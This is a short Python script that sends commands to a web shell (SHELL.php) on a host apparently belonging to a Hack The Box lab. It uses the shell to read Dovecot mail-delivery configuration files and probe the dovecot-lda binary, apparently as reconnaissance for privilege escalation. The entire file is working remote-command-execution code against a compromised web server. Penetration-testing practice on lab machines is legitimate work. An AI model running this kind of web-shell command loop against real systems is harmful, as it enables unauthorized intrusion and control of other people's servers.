import urllib.request, urllib.parse

cmds = [
    # Check mail delivery config
    "cat /etc/dovecot/conf.d/10-mail.conf 2>&1",
    # Check if deliver binary can be used as LDA
    "ls -la /usr/lib/dovecot/dovecot-lda 2>&1",
    # Check if dovecot-lda can be called with --help
    "/usr/lib/dovecot/dovecot-lda --help 2>&1 | head -20",
    # Check if postfix has a dovecot LDA setup
    "cat /etc/dovecot/conf.d/15-lda.conf 2>&1",
]

for cmd in cmds:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result and "Permission denied" not in result:
            print(f"=== {cmd[:60]} ===")
            print(result[:2000])
            print()
    except Exception as e:
        pass
